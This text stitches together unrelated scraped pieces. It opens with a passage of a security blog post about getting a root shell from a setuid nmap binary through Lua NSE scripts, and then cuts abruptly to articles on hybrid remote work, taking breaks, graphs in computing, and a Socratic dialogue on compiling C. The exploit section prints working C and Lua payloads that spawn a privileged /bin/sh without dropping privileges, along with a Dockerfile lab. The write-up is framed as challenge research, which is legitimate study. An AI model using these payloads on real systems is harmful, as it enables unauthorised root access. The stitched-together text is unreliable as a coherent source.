Nmap done: 0 IP addresses (0 hosts up) scanned in 0.38 seconds
</code></pre></div></div>

<p>Justin spent some time trying to take it further by popping a shell without dropping privileges, however realised that this wasn’t as straight forward as originally hoped and decided to move onto the next challenge. This raised the question, how can we do it?</p>

<p>This blog will attempt to explore and solve the challenge of getting a shell through a setuid binary executing Lua scripts without dropping privileges. While this blog post will stick to using nmap for it’s examples, it’s important to note that this should affect most applications that run Lua scripts as a privileged user and is not limited to nmap.</p>

<p>Some readers might remember that nmap used to have an <code>--interactive</code> argument which allowed it to run arbitrary system commands. This could, in certain circumstances, allow privilege escalation if nmap had the setuid bit set (as seen in this challenge), or if a user was given access to run nmap with sudo:</p>

<div><div><pre><code>$ nmap --interactive
nmap&gt; !sh
sh-3.2#
</code></pre></div></div>

<p>The <code>--interactive</code> argument was removed from nmap in <a href="https://seclists.org/nmap-dev/2010/q1/1241">r17131</a> back in 2010, however another way of executing system commands is to use the <a href="https://nmap.org/book/man-nse.html">Nmap Scripting Engine (NSE)</a> that leverages <a href="https://www.lua.org/docs.html">Lua</a> to perform variety of networking tasks which is able to be easily automated. Here’s an example nmap script that uses Lua to run an arbitrary system command:</p>

<div><div><pre><code>user@448a09095d55:~$ cat ./execute.nse
os.execute("sh");

user@448a09095d55:~$ nmap --script=execute.nse

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-19 06:48 UTC
$ uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
</code></pre></div></div>

<p>As demonstrated, using nmap to run abitrary system commands is pretty easy. So lets set up nmap to run as root and see what user we are when Lua executes our system command:</p>

<div><div><pre><code>root@448a09095d55:~# chmod u+s /usr/bin/nmap
root@448a09095d55:~# ls -l /usr/bin/nmap
-rwsr-xr-x. 1 root root 2961432 Apr 16  2018 /usr/bin/nmap
</code></pre></div></div>
<div><div><pre><code>user@448a09095d55:~$ cat id.nse
os.execute("/usr/bin/id");
</code></pre></div></div>
<div><div><pre><code>user@448a09095d55:~$ nmap --script=./id.nse

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-19 04:21 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
[...]

</code></pre></div></div>

<p>You may have expected that running <code>/usr/bin/id</code> through Lua from the suid binary would have been executed as root, however it’s still being executed by the current user. If we take a look at the <a href="https://github.com/lua/lua/blob/63295f1f7fa052fabcb4d69d49203cf33a7deef0/loslib.c#L142-L153">Lua source code</a> to understand why, we can see that <code>os.execute()</code> takes a single argument which gets stored in the <code>cmd</code> variable, and then calls the underlying <code>system</code> function directly in C:</p>

<div><div><pre><code>static int os_execute (lua_State *L) {
  const char *cmd = luaL_optstring(L, 1, NULL);
  int stat;
  errno = 0;
  stat = system(cmd);
  if (cmd != NULL)
    return luaL_execresult(L, stat);
  else {
    lua_pushboolean(L, stat);  /* true if there is a shell */
    return 1;
  }
}
</code></pre></div></div>

<p>This is problematic in our case because the way <code>system</code> works under the hood is by calling  <code>execve()</code> with <code>["/bin/sh", "-c", "&lt;cmd&gt;"]</code>. By default, <code>sh</code> will now drop privileges unless you provide a <code>-p</code> argument to tell it not to do so. As everything after <code>-c</code> is being treated as part of the command, we are unable to use any tricks like argument injection to introduce a <code>-p</code> argument. This means the expected behaviour is to have our privileges dropped before executing our command.</p>

<p>This behaviour of <code>system</code> can also be shown through the use of <code>strace</code>:</p>

<div><div><pre><code>user@448a09095d55:~$ strace -f -e execve nmap --script=./id.nse
execve("/usr/bin/nmap", ["nmap", "--script=./id.nse"], 0x7ffe00dec7e0 /* 8 vars */) = 0

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-19 04:27 UTC
strace: Process 30 attached
[pid    30] execve("/bin/sh", ["sh", "-c", "/usr/bin/id"], 0x7ffe3b97c030 /* 8 vars */) = 0
strace: Process 31 attached
[pid    31] execve("/usr/bin/id", ["/usr/bin/id"], 0x55abbbe01b30 /* 8 vars */) = 0
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
[...]
</code></pre></div></div>

<p>I decided to start going through Lua documentation to look for other potential functionality that may allow for another process to be executed without dropping privileges.</p>

<p>One idea was to use Lua’s file APIs to read and write files to privileged areas as the suid user. This could include dropping in your own SSH key to <code>~/.ssh/authorized_keys</code> or  modifying the user’s <code>~/.bashrc</code> to do something when they login. While this could work, this method isn’t guaranteed to result in a shell, or, may have a delay in receiving a shell. It’d be better if it was possible to have an immediate shell.</p>

<p>Lua has some support to chmod files through the use of external packages. This led me down another path exploring the idea of dropping an ELF file and trying to chmod a binary to set the suid bit through Lua. Unfortunately, all of the packages explored  use a <code>system()</code> call to run the <code>/usr/bin/chmod</code> binary, which as we know, drops privileges and leaves us in the same position.</p>

<p>Another interesting piece of functionality that I came across was the ability to write <a href="https://www.lua.org/pil/26.1.html">custom Lua functions</a> in C. This seemed promising as this would allow native C functions to be executed. This means the <code>execve</code> system call could be called from a custom Lua module that has been written in C, which would bypass the shell and not drop privileges. To test this idea, I created the following C module:</p>

<div><div><pre><code>user@448a09095d55:~$ cat inluaofaname.c
#include "lua.h"
#include "lauxlib.h"
#include &lt;unistd.h&gt;

int sh(lua_State *L) {
    setuid(geteuid());
    char* argv[] = {"/bin/sh","-p",NULL}; // Start /bin/sh without dropping privs
    char* envp[] = {NULL};
    execve(argv[0], argv, envp);
    return 1;
}

static const struct luaL_Reg functions [] = {
    {"sh", sh},
    {NULL, NULL}
};

int luaopen_inluaofaname(lua_State *L) {
    lua_newtable(L);
    luaL_newlib (L, functions);
    lua_setglobal(L, "inluaofaname");
    return 1;
}
</code></pre></div></div>

<p>The module was then compiled as a shared object and the following Lua script was created to use the new “inluaofaname” module:</p>

<div><div><pre><code>user@448a09095d55:~$ gcc -I/usr/include/lua5.3 -o inluaofaname.so -shared -fpic inluaofaname.c

user@448a09095d55:~$ cat inluaofaname.nse
package.cpath = "./?.so"
require "inluaofaname"
inluaofaname.sh()
</code></pre></div></div>

<p>Running nmap again and passing in the <code>inluaofaname.nse</code> Lua script, we can see that it was possible to successfully pop a shell without it dropping privileges:</p>

<div><div><pre><code>user@448a09095d55:~$ nmap --script=./inluaofaname.nse

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-19 09:28 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

# uid=0(root) gid=1000(user) groups=1000(user),27(sudo)
#
</code></pre></div></div>

<p>While this certainly works, it does have a few caveats. Firstly, as it’s written for Lua 5.3, it would require modification to work with older versions of Lua. Secondly, not every box is guaranteed to have the Lua headers which would mean you would have to compile locally and uploading the shared object to the target. Daniel Hodson came up with a similar idea of using a shared object but using a constructor that which executes <code>/bin/sh</code>. This means when the shared object is loaded, the code would run immediately before anything else. The code is as follows:</p>

<div><div><pre><code>#include &lt;unistd.h&gt;
static int luaopen_hello = 0;
static void before_main(void) __attribute__((constructor));
static void before_main(void)
{
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  setreuid(geteuid(), geteuid());
  setregid(getegid(), getegid());
  execve(argv[0], argv, envp);
}
</code></pre></div></div>

<p>I created the following Dockerfile that you can use if you want to test either payload yourself. It should be noted that the Docker environment differs slightly from the hideandseek challenge as the nmap binary is owned by root instead of the hideandseek user:</p>

<div><div><pre><code>FROM ubuntu:18.04

RUN apt update -y
RUN apt install -y \
    sudo \
    nmap \
    lua5.3 \
    lua5.3-dev \
    vim \
    gcc

RUN chmod u+s /usr/bin/nmap

# Create test user with password 'user'
RUN groupadd --gid 1000 user
RUN useradd -m --uid 1000 --gid 1000 -p '$6$xyz$uPGc.8fHvBhvadIKtIhOu6uNp5ySM5AA4/OCLPE3QyFJR2tczRv02BLAQoMZZaK0PKbGbgGRXXwk0.2hNHHyT0' user
RUN usermod -aG sudo user

WORKDIR /home/user
USER user

CMD ["bash"]
</code></pre></div></div>

<p>The final <code>inluaofaname.nse</code> payload contains the following:</p>

<div><div><pre><code>package.cpath = "/tmp/?.so"
payload = [[
#include &lt;unistd.h&gt;
static int luaopen_hello = 0;
static void before_main(void) __attribute__((constructor));
static void before_main(void)
{
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  setuid(geteuid());
  setgid(getegid());
  execve(argv[0], argv, envp);
}
]]
local out = assert(io.open("/tmp/inluaofaname.c", "wb"))
out:write(payload)
out:close()
os.execute("gcc /tmp/inluaofaname.c -o /tmp/inluaofaname.so -shared -fPIC")
require "inluaofaname"
</code></pre></div></div>

<p>Piecing everything together, we are able to still run <code>/bin/sh</code> without dropping privileges:</p>

<div><div><pre><code>user@448a09095d55:~$ nmap --script=./inluaofaname.nse

July 17, 2020 | https://nohq.co/blog/the-hybrid-approach-to-remote-work/ | <a href="https://web.archive.org/web/*/https://nohq.co/blog/the-hybrid-approach-to-remote-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>One half of the team in an office, the other one globally distributed. The hybrid approach&nbsp;to remote work is gaining popularity – but is it the best way forward, and what are the caveats of this type of remote work?</p>
<p>The hybrid remote approach is what usually happens when a previously co-located company starts hiring remote workers, so a major office exists with remote workers mostly playing a minor or equal role. While other definitions may be closer to what we call <a href="https://nohq.co/glossary/work-from-home-wfh/">WFH</a>, we classify hybrid remote work when one major part of the company works from an office – either full-time or part-time – and another major part is fully remote. If going to the office is optional and the exception, we would classify it as <a href="https://nohq.co/glossary/remote-first/">remote-first</a>, while having a small number of remote workers or even just local people working from home is closer to "<a href="https://nohq.co/glossary/remote-ok/">Remote OK</a>" or a Work-from-Home scheme.</p>
<h2>What advantages does hybrid remote have?</h2>
<p>Hybrid remote is so popular these days because of its easy adoption. A company that already has a sizeable office can <a href="https://zapier.com/blog/remote-work-automation/">set up workflows for remote workers</a>, and build their remote presence right away. For teams that either have specialized hiring requirements or simply big scale hiring requirements, this can be a lifesaver. In many edges of the world, access to remote talent is far greater than their local pools. If you are working with technologies or methods that require specialization, hiring people remotely can be the only way to success.</p>
<p>Going hybrid remote is also a great starter for a good remote, <a href="https://twist.com/remote-work-guides/remote-team-communication">async</a> and knowledge exchange strategy for the whole company. If done properly, it can force people into being more serious about documentation, more aware of timing and thoughtful messaging, and finally can allow employees in the office to take advantage of the benefits of remote work, by being more flexible with their commute and Work-From-Home time.</p>
<p>With all of these points combined, it is also the easiest starting step to <a href="https://nohq.co/blog/transitioning-to-being-a-remote-workplace/">seriously evaluate a full all-remote transition</a>. If you are tempted to close down your office entirely or make it optional for people to come there, it helps you know whether your workflows can hold up, whether employees are generally open for it and how communication works. The best time to go all-remote is as soon as nobody is showing up to the office anymore!&nbsp;</p>
<h2>What challenges does hybrid remote have?</h2>
<p>The hybrid model is often criticised because it can stand to the contrary of a remote-first mindset. That means that there is a constant danger that remote employees can become a "second-class citizen" and need to prove themselves extra strongly to be taken into account for promotions or positions that may be given out.</p>
<p>It's also quite common that the leadership of a company is based in the majority office, bringing more influence to local workers, as they have more opportunities for exchange and more visibility. That further leads to a divide between office workers and remote workers.</p>
<p>Last but not least, it creates inequality amongst employees. The remote employees have more flexibility in their time and organisation, but office employees have access to office benefits. Remote employees might need to join out-of-working-time meetings, but office employees spend time on their commute. It all levels out eventually, but you will always get into awkward positions where some employees would prefer the benefits of the other party, which is difficult to solve.</p>
<h2>How can I overcome the challenges of hybrid remote?</h2>
<p>The fact that this model can work out is proven by many large-scale companies, such as <a href="https://nohq.co/blog/its-okay-for-different-offices-to-have-different-c/">Stripe</a>. However, some ground rules need to be set. At its core, a company should strive to get towards a remote-first mindset as closely as possible. Let's go over what that exactly means.</p>
<h3>Adopting an async form of communication</h3>
<p>It's a universal truth that communication across timezones and the barriers of the web is best done through <a href="https://nohq.co/blog/making-asynchronous-communication-work/">async communication</a>. In its essence, async communication channels consist of mediums that do not require or even expect instant replies. Formally, they are defined as having the ability to deliver messages, even if the counterpart is not online. In today's world, it's also a factor whether the recipients are&nbsp;<em>expected</em> to be online to receive a message like it is often the case with instant messengers.</p>
<p>Async communication comes in many forms: You can adopt email as your central way to communicate, you can use a <a href="https://nohq.co/blog/beau-lebens-automattic/">forum-like software like P2</a> or <a href="https://basecamp.com/?ref=nohq">Basecamp</a> or use a specialized piece of software like <a href="https://twist.com/?ref=nohq">Twist</a>. More than the tool, it's important to stick to the async workflow:</p>
<ul>
<li>making sure that messages are complete, not fast</li>
<li>not expecting immediate replies</li>
<li>using rich text, links and emojis to give background information and show emotion</li>
</ul>
<p>The reason for doing asynchronous communication is that it's easier to follow a discussion and decisions after they have happened. While instant messaging software like <a href="https://nohq.co/blog/effectively-using-slack-for-remote-work/">Slack</a> tends to lose histories or make them hard to follow, async communication usually follows a strict flow which can be archived and read even days after a decision was taken.</p>
<h3>Making decisions and stakeholders accessible to remote workers</h3>
<p>A major error that hybrid companies tend to make is to have remote workers, but never let stakeholders, founders and managers work from home. To build an environment where remote and in-office workers are equal, it's also important that key people in an organisation are mixed between the office and remotely, even if it's just for a few days per week.</p>
<p>This also removes the <a href="https://nohq.co/blog/sid-sijbrandij-people-dont-want-to-commute-they-ju/">feeling of missing out</a>: Suddenly, decisions have to be discussed online or written down to be able to discuss them. If key people in an organisation work together from an office, it's easy to make decisions and lead discussions in that limited circle. If people are remote, they miss out on that.</p>
<p>Finally, meetings are a big point of discussion. Especially if meetings are a mix of a big meeting room and single remote workers, things can get hectic and messy. You can counteract that by <a href="https://nohq.co/blog/remote-meeting-best-practices/">establishing best practises</a>, making people join from their own devices, have meetings exclusively online and adopt online tools to brainstorm, conceptualize and discuss.</p>
<h3>Fair compensation for remote workers</h3>
<p>There's a big chance that your in-office workers have access to <a href="https://nohq.co/blog/perks-for-your-remote-employees/">perks that your remote workers don't</a>: be it snacks in the office, exciting break rooms, maybe even catered lunches or an in-house gym. Especially when it comes to fully remote workers, you need to be able to match them in some way or another.</p>
<p>In some cases, that means putting more cash in your remote employee's hands, in others that means pre-defined budgets or a different set of perks where needed.</p>
<p>Especially once it comes to international remote work, things get even more complicated: Be sure you talk about your employees about their expected compensation, about the deductions they have to expect and the key benefits that are usual in their country.</p>
<h2>How should I start with the transition of going remote?</h2>
<p>If you've made it up until here, it's great to know that you are playing with the thought of building a partially remote team. By now, you should know more about the benefits that a remote workforce can bring you, but also the challenges that will be in your way, and hopefully a first way to overcome them.</p>
<p>Now it's time to <a href="https://nohq.co/start/transition/">start the transition to remote work</a>. The best way to start it by sending people home today (especially managers and key stakeholders) and see where things are rough. As already mentioned, the great thing about being hybrid-remote is that you can experiment with things, see how they work and prepare yourself to a full transition like that.</p>
<p>To reiterate, it's important that remote and in-office folks can see eye-to-eye. It's crucial not to rely on meetings or having people online to get things done, and that employees are on board with the changes that are coming. If you have those things in order, nothing can stop you!</p>

They focus on recovery nearly as much as at their actual performance.</p><p>According to DeskTime, an app tracking people’s activity on their computer, the top 10 % most productive people work on average for 52 minutes and then&nbsp;<a href="https://desktime.com/blog/17-52-ratio-most-productive-people">take a break for 17 minutes.</a></p><p>So let's take a look at how we can use good breaks to improve our mental performance.</p><h2>What is an effective break (and what is not)?</h2><p><img src="https://www.deprocrastination.co/assets/illustrations/good_vs_bad_breaks_bg_tw.png" referrerpolicy="no-referrer" alt="Good breaks vs bad breaks - bad breaks derail the day"></p><p>We'll start with bad breaks—breaks that make you feel worse or lead to unproductive states of mind.</p><p><strong>Bad breaks:</strong></p><ul><li>Social media use (without effective boundaries in place).</li><li>Watching YouTube, Netflix, Twitch,...</li><li>Eating junk food</li><li>Browsing shopping sites aimlessly</li></ul><p>You can do all of these activities during your leisure time, no problem there, but if you try to fit them into your work day as a break, they often derail it.</p><p><strong>Avoid highly stimulating, addictive activities during your breaks.</strong></p><p>Instead, choose break activities that give your mind a chance to relax.</p><p>What's a good and effective break?</p><p>Here are some ideas for you!</p><p><strong>Good breaks</strong>:</p><ul><li>Brew coffee or tea.</li><li>Do a breathing exercise or meditate.</li><li>Stare out of a window.</li><li>Read a page of a book or a blog post.<br>This can be a good substitute for social media checking.</li><li>Tidy up a part of your room.</li><li>Lie down your eyes closed or nap.</li><li>Stand up and stretch.</li><li>Take a short walk.<br>(Studies say that taking a walk through nature boosts your ability to      concentrate by as much as 20 % and at the same time reduces your stress      levels.)</li><li>Have a chat with a roommate or a colleague.</li><li>Call someone.</li><li>Do a quick workout.</li><li>Take a nap.</li><li>Take a shower.</li><li>Eat a healthy snack.</li><li>Doodle.</li></ul><p>All of these activities let your mind switch from concentration to relaxation.</p><p>Whichever activity you choose, do something that doesn't stimulate the same part of the brain you're using for work.</p><p><strong>When you let your mind wander more often, you can stumble upon new insights that wouldn't occur to you in the heads-down work mode.</strong>&nbsp;Many creative people report they have their best ideas in a shower, in a bath, or while doing menial work.</p><p>In fact, one of the best break options is to not using your brain at all for a moment—<em>by taking a nap.</em></p><h3>Nap your way to increased productivity</h3><p><img src="https://www.deprocrastination.co/assets/illustrations/napping.png" referrerpolicy="no-referrer" alt="Nap your way to increased productivity"></p><p>Napping is an awesome skill to develop.</p><p>Many people say they don’t like napping or sleeping during the day in general.

    <p><span>30 Jun 2020</span></p><p>Research has begun to reveal many algorithms can be expressed as matrix multiplication, suggesting an unrealized connection between linear algebra and computer science. I speculate graphs are the missing piece of the puzzle. Graphs are not only useful as cognitive aides, but are suitable data structures for a wide variety of tasks, particularly on modern parallel processing hardware.</p>

<p>In this essay, I explore the virtues of graphs, algebra, types, and show how these concepts can help us reason about programs. I propose a computational primitive based on graph signal processing, linking software engineering, graphs, and linear algebra. Finally, I share my predictions for the path ahead, which I consider to be the start of an exciting new chapter in computing history.</p>

<p>Over the last decade, I bet on some strange ideas. A lot of people I looked up to at the time laughed at me. I’ll bet they aren’t laughing anymore. I ought to thank them one day, because their laughter gave me a lot of motivation. I’ve said some idiotic things to be sure, but I’ve also made some laughable predictions that were correct. Lesson learned: aim straighter.</p>

<p>In 2012, I was in Austin sitting next to an ex-poker player named <a href="https://twitter.com/amirpc">Amir</a> who was singing Hinton’s praises. Hypnotized by his technicolor slides, I quit my job in a hurry and started an educational project using speech recognition and restricted Boltzmann machines. It never panned out, but I learned a lot about ASR and Android audio. Still love <a href="http://breandan.net/2014/02/09/the-end-of-illiteracy/">that idea</a>.</p>

<p>In 2017, I started writing a book on the ethics of automation and <a href="http://breandan.net/2017/02/02/trust-in-automation/">predicted</a> mass unemployment and social unrest. Although I got the causes wrong (pandemic, go figure), the information economy and confirmation bias takes were all dead right. Sadly, this is now driving the world completely insane. Don’t say I warned you, go out and fix our broken systems. The world needs more engineers who care.</p>

</center>

<p>In 2017, I witnessed the birth of <a href="https://colah.github.io/posts/2015-09-NN-Types-FP/">differentiable programming</a>, which I stole from Chris Olah and turned into a <a href="https://github.com/breandan/kotlingrad/blob/master/latex/thesis/thesis.pdf">master’s thesis</a>. Had a lot of trouble convincing people that classical programs could be made differentiable, but look at the proceedings of any machine learning conference today and you’ll find dozens of papers on differentiable sorting and rendering and simulation. Don’t thank me, thank Chris and the Theano guys.</p>

<p>In 2018, I correctly predicted Microsoft would acquire GitHub to mine code. Why MS and not Google? I’ll bet they tried, but Google’s leadership had fantasies of AGI and besides JetBrains, MS were the only ones who gave a damn about developers. Now ML4SE is a thriving <a href="https://ml4se.github.io/">research area</a> and showing up in <a href="https://github.com/JetBrains-Research/DeepBugsPlugin">real</a> <a href="https://devblogs.microsoft.com/visualstudio/ai-assisted-intellisense-for-your-teams-codebase/">products</a>, much to the chagrin of those who believed ML was a fad. I suspect their hype filter blinded them to the value those tools provide.</p>

<center>
<blockquote><p lang="en" dir="ltr">Prediction: MS will acquire GH within five years. If the <a href="https://twitter.com/hashtag/ML4Code?src=hash&amp;ref_src=twsrc%5Etfw">#ML4Code</a> stuff delivers for MS, acquisition is highly likely. Although it would have been cheaper a few years ago. <a href="https://t.co/5ZMtiRtifD">https://t.co/5ZMtiRtifD</a> <a href="https://t.co/TaxkArm5ps">https://t.co/TaxkArm5ps</a></p>— breandan (@breandan) <a href="https://twitter.com/breandan/status/993553301927936001?ref_src=twsrc%5Etfw">May 7, 2018</a></blockquote>

</center>

<p>But to heck with everything I’ve said! If I had just one idea to share with these ML people, it would be types. Beat that drum as loud as I could. Types are the best tool we know for synthetic reasoning. If you want to build provably correct systems that scale on real-world applications, use types. Not everyone is convinced yet, but mark my words, <a href="https://github.com/tensorflow/tensorflow/issues/12345">types</a> are <a href="https://docs.python.org/3.9/whatsnew/3.9.html#pep-585-builtin-generic-types">coming</a>. Whoever figures out how to connect types and learning will be the next Barbara Liskov or Frances Allen.</p>

<p>This year, I predicted the pandemic weeks before the lockdown, exited the market, and turned down a job at Google. Some people called me crazy. Now I’m going all-in on some new ideas (none of which are mine). I’m making some big bets and some will be wrong, but I see the very same spark of genius in them.</p>



<p>As a kid, I was given a book on the history of mathematics. I remember it had some interesting puzzles, including one with <a href="https://en.wikipedia.org/wiki/Seven_Bridges_of_K%C3%B6nigsberg">some bridges</a> in a town divided by rivers, once inhabited by a man called Euler. Was there a tour crossing each bridge exactly once? Was it possible to tell without checking every path? I remember spending days trying to figure out the answer.</p>

<p>In the late 90s, my mom and I went to Ireland. I remember visiting Trinity College, and learning about a mathematician called <a href="https://en.wikipedia.org/wiki/William_Rowan_Hamilton">Hamilton</a> who discovered a famous formula connecting algebra and geometry, and carved it onto a <a href="https://en.wikipedia.org/wiki/Broom_Bridge">bridge</a>. We later visited the bridge, and the tour guide pointed out the stone, which we touched for good luck. The Irish have a <a href="https://en.wikipedia.org/wiki/Poulnabrone_dolmen">thing</a> for <a href="https://en.wikipedia.org/wiki/Newgrange">stones</a>.</p>

<p>In 2007, I was applying to college and took the train from Boston to South Bend, Indiana, home of the Fighting Irish. Wandering about, I picked up a magazine article by a Hungarian mathematician called <a href="https://en.wikipedia.org/wiki/Albert-L%C3%A1szl%C3%B3_Barab%C3%A1si">Barabási</a> then at Notre Dame, who had some interesting things to say about <a href="https://en.wikipedia.org/wiki/Complex_network">complex networks</a>. Later in 2009, while studying in Rochester, I <a href="http://brea.ndan.co/images/complex_network_seminar.png">carpooled</a> with a <a href="https://avesis.medeniyet.edu.tr/hasan.guclu">nice professor</a>, and learned complex networks are found in brains, languages and many marvelous places.</p>

<p>Fast forward to 2017. I was lured by the siren song of algorithmic differentiation. Olivier Breleux presented <a href="https://github.com/mila-iqia/myia">Myia</a> and <a href="https://github.com/breuleux/buche">Buche</a>. Matt Johnson gave a talk on <a href="https://github.com/HIPS/autograd">Autograd</a>. I met Chris Olah in Long Beach, who gave me the idea to study <a href="https://colah.github.io/posts/2015-09-NN-Types-FP/">differentiable programming</a>. I stole his idea, dressed it up in Kotlin and traded it for a POPL workshop paper and later a <a href="https://github.com/breandan/kotlingrad/blob/master/latex/thesis/thesis.pdf">Master’s thesis</a>.

<p>In 2019, I joined a lab with a <a href="https://www.cs.mcgill.ca/~jguo/">nice professor</a> at McGill applying knowledge graphs to software engineering. Like logical reasoning, knowledge graphs are an idea from the first wave of AI in the 1960s and 70s which have been revived and studied in light of recent progress in the field. I believe this is an important area of research with a lot of potential. Knowledge and traceability plays a big role in software engineering, and it’s the bread-and-butter of a good IDE. The world needs better IDEs if we’re ever going to untangle this mess we’re in.</p>

<p>This Spring, I took a fascinating seminar on <a href="https://cs.mcgill.ca/~wlh/comp766/index.html">Graph Representation Learning</a>. A lot of delightful graph theory has been worked out over the last decade. <a href="https://en.wikipedia.org/wiki/PageRank">PageRank</a> turned into power iteration. People have discovered many interesting connections to linear algebra, including Weisfeiler-Lehman graph kernels, graph Laplacians, Krylov methods, and spectral graph theory. These ideas have deepened our understanding of graph signal processing and its applications for learning and program analysis. More on that <a href="#graphs-computationally">later</a>.</p>



<p>Graphs are general-purpose data structures used to represent a variety of data types and procedural phenomena. Unlike most sequential languages, graphs are capable of expressing a much richer family of relations between entities, and are a natural fit for many problems in computer science, physics, biology and mathematics. Consider the following hierarchy of data structures, all of which are graphs with increasing expressive power:</p>

<ul>
  <li><strong>Sets</strong>: datasets, multisets, posets, alphabets</li>
  <li><strong>Sequences</strong>: Lists, strings, arrays, linear function composition</li>
  <li><strong>Trees</strong>: <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Abstract syntax</a>, <a href="https://en.wikipedia.org/wiki/Document_Object_Model">XML</a>, <a href="https://en.wikipedia.org/wiki/Phylogenetic_tree">phylogeny</a>, <a href="https://en.wikipedia.org/wiki/Decision_tree">decision trees</a></li>

</ul>

<p>As we realized in <a href="https://github.com/breandan/kotlingrad">Kotlin∇</a>, directed graphs can be used to model mathematical expressions, as well as other formal languages, including source code, intermediate representations and binary artifacts. Not only can graphs be used to describe extant human knowledge, many recent examples have shown that machines can “grow” trees and graphs for various applications, such as program synthesis, mathematical deduction and physical simulation. Recent neuro-symbolic applications have shown promising early results in graph synthesis:</p>

</ul>

<p>The field of natural language processing has also developed a rich set of graph-based representations, such as <a href="https://en.wikipedia.org/wiki/Phrase_structure_grammar">constituency</a>, <a href="https://en.wikipedia.org/wiki/Dependency_grammar">dependency</a>, <a href="https://en.wikipedia.org/wiki/Link_grammar">link</a> and other and other typed attribute grammars which can be used to reason about syntactic and semantic relations between natural language entities. Research has begun to show many practical applications for such grammars in the extraction and organization of human knowledge stored in large text corpora. Those graphs can be further processed into ontologies for logical reasoning.</p>

<p>Using coreference resolution and entity alignment techniques, we can reconstruct internally consistent relations between entities, which capture cross-corpus consensus in natural language datasets. When stored in <a href="https://arxiv.org/pdf/2003.02320.pdf">knowledge graphs</a>, these relations can be used for information retrieval and question answering, e.g. on wikis and other content management systems. Recent techniques have shown promise in automatic knowledge base construction (cf. <a href="https://www.mitpressjournals.org/doi/pdf/10.1162/tacl_a_00088">Reddy et al.</a>, 2016).</p>

				<h2 id="introduction">Introduction</h2>

<p>Undeterred by the <a href="https://fglt.nl/agora/book-01-the-tragedy-of-open-hardware.html">harsh realities of open hardware</a>, Glaucon returns to the agora, this time hoping for assistance with compiling an operating system for a 16-bit computer.  Socrates again steps up to assist, ignoring the heckling of Thrasymachus and Adeimantus.  They are joined by Diogenes, a plain-speaking and direct Corinthian.  Cephalus, a Cretin knowledgeable on older hardware and esoteric operating systems, attempts to give Glaucon a few other possible leads in his pursuit of computing perfection.  It becomes somewhat clearer that Glaucon has bitten off rather more than he can chew.</p>

<h2 id="dramatis-personae">Dramatis personae</h2>

<p>In order of appearance:</p>

<ul>
  <li><strong>Glaucon:</strong> A Cretin visitor to the agora, with grand ideals of freedom and minimalism in computing</li>
  <li><strong>Socrates:</strong> Famed philosopher-engineer of Athens</li>
  <li><strong>Diogenes:</strong> A confrontational and iconoclastic Corinthian</li>
  <li><strong>Thrasymachus:</strong> An Ithacan, baffled by Glaucon’s goals</li>
  <li><strong>Adeimantus:</strong> A Cretin,  impatient with Glaucon’s idealism</li>
  <li><strong>Cephalus:</strong> A Cretin, knowledgeable on older hardware and operating systems, and more sympathetic to Glaucon’s aims</li>
</ul>

<h2 id="prelude">Prelude</h2>

<p><strong>Glaucon:</strong> so, uh<br>
<strong>Glaucon:</strong> I still don’t understand how compilation works<br>
<strong>Glaucon:</strong> if I have a simple program, with the only requirements being—let’s say—just the C compiler and <code>make</code>, as long as my system has some form of <code>make</code> and—let’s say—<code>tcc</code>, it’ll compile correctly?<br>
<strong>Socrates:</strong> is this a practical or a theoretical question?<br>
<strong>Glaucon:</strong> practical—I’ve never compiled anything successfully before<br>
<strong>Glaucon:</strong> I never figured out how it worked<br>
<strong>Socrates:</strong> it should be said that neither of those are requirements of the program, they’re requirements to compile the program<br>
<strong>Socrates:</strong> which is subtly different<br>
<strong>Glaucon:</strong> right right<br>
<strong>Glaucon:</strong> because once compiled the program should just run on its own, right?<br>
<strong>Socrates:</strong> if the compiled program has no runtime dependencies, sure<br>
<strong>Glaucon:</strong> &gt;runtime dependencies<br>
<strong>Glaucon:</strong> bloat</p>

<h2 id="if-you-come-at-the-king">If you come at the King…</h2>

<p><strong>Socrates:</strong> so we’ll stick to C here<br>
<strong>Socrates:</strong> but the concept is fairly general<br>
<strong>Socrates:</strong> a compiler takes Translation Units (usually a file) and parses the code, and then turns that into an object file<br>
<strong>Socrates:</strong> so if you have a program with two files: <code>frontend.c</code> (which has <code>main()</code>, etc, to read input) and <code>compute.c</code> (which does some kind of stuff with them), then you will use the compiler twice, to generate <code>frontend.o</code> and <code>compute.o</code><br>
<strong>Diogenes:</strong> &gt;not calling it Compilation Units<br>
<strong>Diogenes:</strong> very disappointed<br>
<strong>Socrates:</strong> Diogenes: that’s because compilation unit wouldn’t be correct in the context of the C standard<br>
<strong>Socrates:</strong> <a href="https://stackoverflow.com/questions/1106149/what-is-a-translation-unit-in-c">https://stackoverflow.com/questions/1106149/what-is-a-translation-unit-in-c</a><br>
<strong>Diogenes:</strong> change the standard<br>
<strong>Thrasymachus:</strong> <a href="https://nitter.net/dril/status/134787490526658561">https://nitter.net/dril/status/134787490526658561</a></p>

<h2 id="compiling-new-software-on-old-hardware">Compiling new software on old hardware</h2>

<p><strong>Socrates:</strong> so these files are essentially at this point just binary versions of the source files: each function gets a tag for its name, etc, and then a body of machine code, but that’s all<br>
<strong>Glaucon:</strong> I’m lost<br>
<strong>Glaucon:</strong> genuinely I didn’t get that<br>
<strong>Glaucon:</strong> this is far beyond me<br>
<strong>Socrates:</strong> OK<br>
<strong>Socrates:</strong> you’re familiar with the concept of machine code, yeah?<br>
<strong>Glaucon:</strong> lemme simplify my question, because it’s a practical one<br>
<strong>Socrates:</strong> OK, lets take the practical one<br>
<strong>Glaucon:</strong> <a href="https://en.wikipedia.org/wiki/Embeddable_Linux_Kernel_Subset">https://en.wikipedia.org/wiki/Embeddable_Linux_Kernel_Subset</a><br>
<strong>Glaucon:</strong> let’s say I install this on my PC, it’s IA-16 Linux, basically<br>
<strong>Socrates:</strong> OK<br>
